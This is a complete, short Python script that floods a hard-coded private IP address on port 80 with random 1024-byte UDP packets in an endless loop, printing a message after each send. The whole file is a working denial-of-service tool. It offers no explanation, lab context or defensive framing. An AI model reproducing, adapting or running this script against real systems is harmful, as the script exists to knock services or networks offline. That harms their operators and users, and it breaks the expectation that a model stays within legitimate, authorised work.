import socket
import random

target_ip = "10.222.7.213"  #target ip
target_port = 80

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

data = random._urandom(1024)

while True:
    sock.sendto(data, (target_ip, target_port))
    print("UDP packet sent")
